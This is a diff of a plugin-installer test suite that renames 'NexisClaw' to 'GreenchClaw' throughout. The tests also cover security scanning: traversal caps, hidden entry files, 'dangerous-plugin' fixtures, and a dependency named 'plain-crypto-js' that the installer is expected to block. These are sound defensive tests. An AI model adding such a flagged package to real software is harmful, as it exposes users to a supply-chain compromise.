+          pluginName: "trailing-space-GreenchClaw-peer-plugin",
+          relativePath: path.join("node_modules", "GreenchClaw "),
         },
       ] as const;
 
       for (const testCase of cases) {
         const { pluginDir, extensionsDir, tmpDir } = setupPluginInstallDirs();
-        const hostRoot = path.join(tmpDir, "host-NexisClaw");
+        const hostRoot = path.join(tmpDir, "host-GreenchClaw");
         fs.mkdirSync(hostRoot, { recursive: true });
-        fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"NexisClaw"}\n');
-        vi.mocked(resolveNexisClawPackageRootSync).mockReturnValue(hostRoot);
+        fs.writeFileSync(path.join(hostRoot, "package.json"), '{"name":"GreenchClaw"}\n');
+        vi.mocked(resolveGreenchClawPackageRootSync).mockReturnValue(hostRoot);
         writeMinimalPackagePlugin(pluginDir, testCase.pluginName);
 
         const symlinkPath = path.join(pluginDir, testCase.relativePath);
@@ -1753,7 +1759,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-path-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1775,7 +1781,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-file-alias-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1795,7 +1801,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "wide-vendored-tree-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1837,7 +1843,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the directory cap", async () => {
-    vi.stubEnv("NEXISCLAW_INSTALL_SCAN_MAX_DIRECTORIES", "4");
+    vi.stubEnv("GREENCHCLAW_INSTALL_SCAN_MAX_DIRECTORIES", "4");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1845,7 +1851,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "directory-cap-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1865,7 +1871,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the depth cap", async () => {
-    vi.stubEnv("NEXISCLAW_INSTALL_SCAN_MAX_DEPTH", "2");
+    vi.stubEnv("GREENCHCLAW_INSTALL_SCAN_MAX_DEPTH", "2");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1873,7 +1879,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "depth-cap-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1906,7 +1912,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "unreadable-dir-plugin",
           version: "1.0.0",
-          NexisClaw: { extensions: ["index.js"] },
+          GreenchClaw: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1942,7 +1948,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "multiple-blocked-dependencies-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1972,7 +1978,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2004,7 +2010,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "official-dangerous-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2030,14 +2036,14 @@ describe("installPluginFromArchive", () => {
       filter: (entryPath) =>
         !path.relative(sourcePluginDir, entryPath).split(path.sep).includes("node_modules"),
     });
-    vi.mocked(resolveNexisClawPackageRootSync).mockReturnValue(process.cwd());
+    vi.mocked(resolveGreenchClawPackageRootSync).mockReturnValue(process.cwd());
 
     const scanResult = await installSecurityScan.scanPackageInstallSource({
       extensions: ["./index.ts"],
       logger: { warn: vi.fn() },
       packageDir: pluginDir,
       pluginId: "qa-matrix",
-      packageName: "@NexisClaw/qa-matrix",
+      packageName: "@GreenchClaw/qa-matrix",
       manifestId: "qa-matrix",
     });
 
@@ -2052,7 +2058,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "forced-blocked-dependency-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -2386,7 +2392,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hook-findings-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2438,7 +2444,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-blocked-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2490,7 +2496,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-forced-but-blocked-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2533,7 +2539,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "fresh-force-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2566,7 +2572,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "replace-force-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2591,7 +2597,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-entry-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: [".hidden/index.js"] },
+        GreenchClaw: { extensions: [".hidden/index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2615,7 +2621,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-runtime-entry-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: ["index.js"],
           runtimeExtensions: [".hidden/runtime.cjs"],
         },
@@ -2643,7 +2649,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-setup-entry-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: ["index.js"],
           setupEntry: ".hidden/setup.cjs",
         },
@@ -2671,7 +2677,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-runtime-setup-entry-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: ["index.js"],
           setupEntry: "setup.ts",
           runtimeSetupEntry: ".hidden/setup.cjs",
@@ -2701,7 +2707,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-inferred-runtime-entry-plugin",
         version: "1.0.0",
-        NexisClaw: {
+        GreenchClaw: {
           extensions: [".hidden/index.ts"],
         },
       }),
@@ -2731,7 +2737,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "scan-fail-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};");
@@ -2798,7 +2804,7 @@ describe("installPluginFromDir", () => {
   it("preserves local package manifests without dependency surgery", async () => {
     const { pluginDir, extensionsDir } = setupInstallPluginFromDirFixture({
       devDependencies: {
-        NexisClaw: "workspace:*",
+        GreenchClaw: "workspace:*",
         vitest: "^3.0.0",
       },
     });
@@ -2817,7 +2823,7 @@ describe("installPluginFromDir", () => {
     ) as {
       devDependencies?: Record<string, string>;
     };
-    expect(manifest.devDependencies?.NexisClaw).toBe("workspace:*");
+    expect(manifest.devDependencies?.GreenchClaw).toBe("workspace:*");
     expect(manifest.devDependencies?.vitest).toBe("^3.0.0");
     expect(vi.mocked(runCommandWithTimeout)).not.toHaveBeenCalled();
   });
@@ -2856,13 +2862,13 @@ describe("installPluginFromDir", () => {
       hostVersion: "2026.3.21",
       minHostVersion: ">=2026.3.22",
       expectedCode: PLUGIN_INSTALL_ERROR_CODE.INCOMPATIBLE_HOST_VERSION,
-      expectedMessageIncludes: ["requires NexisClaw >=2026.3.22, but this host is 2026.3.21"],
+      expectedMessageIncludes: ["requires GreenchClaw >=2026.3.22, but this host is 2026.3.21"],
     },
     {
       name: "rejects plugins with invalid minHostVersion metadata",
       minHostVersion: "2026.3.22",
       expectedCode: PLUGIN_INSTALL_ERROR_CODE.INVALID_MIN_HOST_VERSION,
-      expectedMessageIncludes: ["invalid package.json NexisClaw.install.minHostVersion"],
+      expectedMessageIncludes: ["invalid package.json GreenchClaw.install.minHostVersion"],
     },
     {
       name: "reports unknown host versions distinctly for minHostVersion-gated plugins",
@@ -2894,7 +2900,7 @@ describe("installPluginFromDir", () => {
     },
   );
 
-  it("uses NexisClaw.plugin.json id as install key when it differs from package name", async () => {
+  it("uses GreenchClaw.plugin.json id as install key when it differs from package name", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "memory-cognee",
     });
@@ -2910,7 +2916,7 @@ describe("installPluginFromDir", () => {
     expect(
       infoMessages.some((msg) =>
         msg.includes(
-          'Plugin manifest id "memory-cognee" differs from npm package name "@NexisClaw/cognee-NexisClaw"',
+          'Plugin manifest id "memory-cognee" differs from npm package name "@GreenchClaw/cognee-GreenchClaw"',
         ),
       ),
     ).toBe(true);
@@ -2919,7 +2925,7 @@ describe("installPluginFromDir", () => {
   it("does not warn when a scoped npm package name matches the manifest id", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "matrix",
-      packageName: "@NexisClaw/matrix",
+      packageName: "@GreenchClaw/matrix",
     });
 
     const infoMessages: string[] = [];
@@ -2949,7 +2955,7 @@ describe("installPluginFromDir", () => {
     {
       name: "package name keeps scoped plugin id by default",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@NexisClaw/test-plugin",
+      expectedPluginId: "@GreenchClaw/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -2959,7 +2965,7 @@ describe("installPluginFromDir", () => {
     {
       name: "unscoped expectedPluginId resolves to scoped install id",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@NexisClaw/test-plugin",
+      expectedPluginId: "@GreenchClaw/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -3057,8 +3063,8 @@ describe("installPluginFromDir", () => {
   });
 });
 
-describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
-  const resolveRootMock = vi.mocked(resolveNexisClawPackageRootSync);
+describe("linkGreenchClawPeerDependencies (via installPluginFromDir)", () => {
+  const resolveRootMock = vi.mocked(resolveGreenchClawPackageRootSync);
 
   function writePluginWithPeerDeps(
     pluginDir: string,
@@ -3071,7 +3077,7 @@ describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
       JSON.stringify({
         name: "peer-dep-plugin",
         version: "1.0.0",
-        NexisClaw: { extensions: ["index.js"] },
+        GreenchClaw: { extensions: ["index.js"] },
         ...(dependencies ? { dependencies } : {}),
         peerDependencies,
       }),
@@ -3080,13 +3086,13 @@ describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n", "utf-8");
   }
 
-  it("creates a node_modules/NexisClaw symlink when peerDependencies declares NexisClaw", async () => {
+  it("creates a node_modules/GreenchClaw symlink when peerDependencies declares GreenchClaw", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     const run = vi.mocked(runCommandWithTimeout);
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { NexisClaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { GreenchClaw: "*" });
 
     const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -3095,19 +3101,19 @@ describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
       return;
     }
 
-    const symlinkPath = path.join(result.targetDir, "node_modules", "NexisClaw");
+    const symlinkPath = path.join(result.targetDir, "node_modules", "GreenchClaw");
     const stat = fs.lstatSync(symlinkPath);
     expect(stat.isSymbolicLink()).toBe(true);
     expect(fs.realpathSync(symlinkPath)).toBe(fs.realpathSync(fakeHostRoot));
     expect(run).not.toHaveBeenCalled();
   });
 
-  it("keeps the NexisClaw peer symlink when a local plugin already has dependencies", async () => {
+  it("keeps the GreenchClaw peer symlink when a local plugin already has dependencies", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { NexisClaw: "*" }, { "is-number": "7.0.0" });
+    writePluginWithPeerDeps(pluginDir, { GreenchClaw: "*" }, { "is-number": "7.0.0" });
     fs.mkdirSync(path.join(pluginDir, "node_modules", "is-number"), { recursive: true });
     fs.writeFileSync(
       path.join(pluginDir, "node_modules", "is-number", "package.json"),
@@ -3122,7 +3128,7 @@ describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
       return;
     }
 
-    const symlinkPath = path.join(result.targetDir, "node_modules", "NexisClaw");
+    const symlinkPath = path.join(result.targetDir, "node_modules", "GreenchClaw");
     expect(fs.lstatSync(symlinkPath).isSymbolicLink()).toBe(true);
     expect(fs.realpathSync(symlinkPath)).toBe(fs.realpathSync(fakeHostRoot));
     expect(fs.existsSync(path.join(result.targetDir, "node_modules", "is-number"))).toBe(true);
@@ -3143,7 +3149,7 @@ describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
     }
 
     const nodeModulesDir = path.join(result.targetDir, "node_modules");
-    const symlinkPath = path.join(nodeModulesDir, "NexisClaw");
+    const symlinkPath = path.join(nodeModulesDir, "GreenchClaw");
     expect(fs.existsSync(symlinkPath)).toBe(false);
   });
 
@@ -3152,7 +3158,7 @@ describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { NexisClaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { GreenchClaw: "*" });
 
     // First install
     const { result: first } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
@@ -3170,22 +3176,22 @@ describe("linkNexisClawPeerDependencies (via installPluginFromDir)", () => {
     if (!second.ok) {
       return;
     }
-    const symlinkPath = path.join(second.targetDir, "node_modules", "NexisClaw");
+    const symlinkPath = path.join(second.targetDir, "node_modules", "GreenchClaw");
     expect(fs.lstatSync(symlinkPath).isSymbolicLink()).toBe(true);
   });
 
-  it("rejects when resolveNexisClawPackageRootSync returns null", async () => {
+  it("rejects when resolveGreenchClawPackageRootSync returns null", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     resolveRootMock.mockReturnValue(null);
 
-    writePluginWithPeerDeps(pluginDir, { NexisClaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { GreenchClaw: "*" });
 
     const { result, warnings } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("plugin-local node_modules/NexisClaw link");
+      expect(result.error).toContain("plugin-local node_modules/GreenchClaw link");
     }
-    expectWarningIncludes(warnings, "Could not locate NexisClaw package root");
+    expectWarningIncludes(warnings, "Could not locate GreenchClaw package root");
   });
 });
